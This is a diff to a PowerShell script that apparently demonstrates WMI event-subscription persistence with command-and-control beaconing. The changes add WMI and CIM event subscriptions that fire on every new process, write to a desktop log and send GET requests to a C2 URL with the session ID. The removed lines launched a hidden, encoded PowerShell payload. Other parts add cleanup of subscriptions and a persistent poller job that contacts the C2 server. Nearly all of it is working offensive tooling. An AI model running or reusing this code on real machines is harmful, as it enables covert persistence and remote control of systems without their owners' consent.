@@ -508,9 +508,45 @@ function Undo-LiveChanges {
         $markers = Get-ChildItem -Path $env:TEMP -Filter 'DemoWmi_*.marker' -ErrorAction SilentlyContinue
         if ($markers) {
             foreach ($m in $markers) {
-                try { Remove-Item -Path $m.FullName -Force -ErrorAction SilentlyContinue } catch {}
+                try {
+                    $content = Get-Content -Path $m.FullName -ErrorAction SilentlyContinue
+                    $srcLine = $content | Where-Object { $_ -match '^Source=' }
+                    $methodLine = $content | Where-Object { $_ -match '^Method=' }
+                    $sourceId = $null
+                    $method = $null
+                    if ($srcLine) { $sourceId = ($srcLine -split '=',2)[1].Trim() }
+                    if ($methodLine) { $method = ($methodLine -split '=',2)[1].Trim() }
+
+                    if ($sourceId) {
+                        # Try to unregister session subscriptions
+                        if ($method -and $method -match 'CIM') {
+                            if (Get-Command -Name Unregister-CimIndicationEvent -ErrorAction SilentlyContinue) {
+                                try { Unregister-CimIndicationEvent -SourceIdentifier $sourceId -ErrorAction SilentlyContinue } catch {}
+                            }
+                            if (Get-Command -Name Unregister-Event -ErrorAction SilentlyContinue) {
+                                try { Unregister-Event -SourceIdentifier $sourceId -ErrorAction SilentlyContinue } catch {}
+                            }
+                        }
+                        elseif ($method -and $method -match 'WMI') {
+                            if (Get-Command -Name Unregister-Event -ErrorAction SilentlyContinue) {
+                                try { Unregister-Event -SourceIdentifier $sourceId -ErrorAction SilentlyContinue } catch {}
+                            }
+                        }
+                        else {
+                            # Generic attempts
+                            if (Get-Command -Name Unregister-CimIndicationEvent -ErrorAction SilentlyContinue) {
+                                try { Unregister-CimIndicationEvent -SourceIdentifier $sourceId -ErrorAction SilentlyContinue } catch {}
+                            }
+                            if (Get-Command -Name Unregister-Event -ErrorAction SilentlyContinue) {
+                                try { Unregister-Event -SourceIdentifier $sourceId -ErrorAction SilentlyContinue } catch {}
+                            }
+                        }
+                    }
+
+                    try { Remove-Item -Path $m.FullName -Force -ErrorAction SilentlyContinue } catch {}
+                } catch {}
             }
-            Write-Host "    [OK] Removed subscription markers." -ForegroundColor Green
+            Write-Host "    [OK] Removed subscription markers and attempted unregister." -ForegroundColor Green
         }
         else {
             Write-Host "    [*] No subscription markers found." -ForegroundColor Gray
@@ -552,6 +588,15 @@ function Start-PersistentProcessPoller {
             }
         }
     }
+
+    # Avoid starting duplicate poller jobs
+    try {
+        $existing = Get-Job -Name $JobName -ErrorAction SilentlyContinue
+        if ($existing) {
+            Write-Host "    [*] Poller job already exists: $JobName" -ForegroundColor Gray
+            return $existing
+        }
+    } catch { }
 
     Start-Job -Name $JobName -ScriptBlock $sb -ArgumentList $DesktopPath,$C2Url,$SessionId,$PollInterval
 }
@@ -622,7 +667,8 @@ try {
             $filterClass = [wmiclass]"\\.\$WmiNamespace:__EventFilter"
             $filterInstance = $filterClass.CreateInstance()
             $filterInstance.Name = $EventName
-            $filterInstance.Query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_Process'"
+            # Exclude PowerShell process names to avoid recursive triggers
+            $filterInstance.Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name != 'powershell.exe' AND TargetInstance.Name != 'pwsh.exe'"
             $filterInstance.QueryLanguage = "WQL"
             $filterInstance.EventNamespace = "root\cimv2"
             $filterResult = $filterInstance.Put()
@@ -655,14 +701,37 @@ try {
 
             if (Get-Command -Name Register-CimIndicationEvent -ErrorAction SilentlyContinue) {
                 try {
-                    $actionScript = "Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-EncodedCommand','$encPayload')"
-                    $actionSB = [ScriptBlock]::Create($actionScript)
+                    # Use an inline action that runs inside this PowerShell session (no Start-Process)
+                    $actionSB = {
+                        param($Event)
+                        try {
+                            $procName = $null
+                            if ($Event -and $Event.SourceEventArgs -and $Event.SourceEventArgs.NewEvent) {
+                                $ne = $Event.SourceEventArgs.NewEvent
+                                if ($ne.ProcessName) { $procName = $ne.ProcessName }
+                                elseif ($ne.TargetInstance -and $ne.TargetInstance.Name) { $procName = $ne.TargetInstance.Name }
+                            }
+                            elseif ($Event -and $Event.NewEvent -and $Event.NewEvent.TargetInstance) {
+                                $inst = $Event.NewEvent.TargetInstance
+                                if ($inst.Name) { $procName = $inst.Name }
+                            }
+
+                            # Avoid recursion: ignore events caused by launching PowerShell itself
+                            if ($procName -and $procName -match 'powershell.exe|pwsh.exe') { return }
+
+                            $dp = [Environment]::GetFolderPath('Desktop')
+                            $msg = "Executed payload at $(Get-Date -Format o) by session $($Global:UniqueId) (trigger: $procName)"
+                            Add-Content -Path (Join-Path $dp 'calcLOG.txt') -Value $msg -ErrorAction SilentlyContinue
+                            try { Invoke-RestMethod -Uri "$($Global:C2Url)/?message=how-are-you-session=$($Global:UniqueId)&trigger=$procName" -Method Get -ErrorAction SilentlyContinue } catch {}
+                        } catch {}
+                    }
+
                     Register-CimIndicationEvent -Namespace 'root\cimv2' -Query $query -SourceIdentifier $source -Action $actionSB -ErrorAction Stop
                     Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
                     Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
                     $registered = $true
 
-                    # Write a marker so Undo and future runs can see there was a session subscription (session-bound cleanup still limited)
+                    # Write a marker so Undo and future runs can see there was a session subscription
                     try { Set-Content -Path (Join-Path $env:TEMP "DemoWmi_$source.marker") -Value "Source=$source`nMethod=CIM`nRegisteredAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
                 }
                 catch {
@@ -674,9 +743,25 @@ try {
 
             if (-not $registered -and (Get-Command -Name Register-WmiEvent -ErrorAction SilentlyContinue)) {
                 try {
-                    $actionScript = "Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-EncodedCommand','$encPayload')"
-                    $actionSB = [ScriptBlock]::Create($actionScript)
-                    Register-WmiEvent -Query $query -SourceIdentifier $source -Action $actionSB -Namespace 'root\cimv2' -ErrorAction Stop
+                    # Inline action for Register-WmiEvent (avoid Start-Process to prevent recursion)
+                    $actionSB2 = {
+                        param($Event)
+                        try {
+                            $procName = $null
+                            if ($Event -and $Event.SourceEventArgs -and $Event.SourceEventArgs.NewEvent) {
+                                $ne = $Event.SourceEventArgs.NewEvent
+                                if ($ne.ProcessName) { $procName = $ne.ProcessName }
+                                elseif ($ne.TargetInstance -and $ne.TargetInstance.Name) { $procName = $ne.TargetInstance.Name }
+                            }
+                            if ($procName -and $procName -match 'powershell.exe|pwsh.exe') { return }
+                            $dp = [Environment]::GetFolderPath('Desktop')
+                            $msg = "Executed payload at $(Get-Date -Format o) by session $($Global:UniqueId) (trigger: $procName)"
+                            Add-Content -Path (Join-Path $dp 'calcLOG.txt') -Value $msg -ErrorAction SilentlyContinue
+                            try { Invoke-RestMethod -Uri "$($Global:C2Url)/?message=how-are-you-session=$($Global:UniqueId)&trigger=$procName" -Method Get -ErrorAction SilentlyContinue } catch {}
+                        } catch {}
+                    }
+
+                    Register-WmiEvent -Query $query -SourceIdentifier $source -Action $actionSB2 -Namespace 'root\cimv2' -ErrorAction Stop
                     Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
                     Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
                     $registered = $true
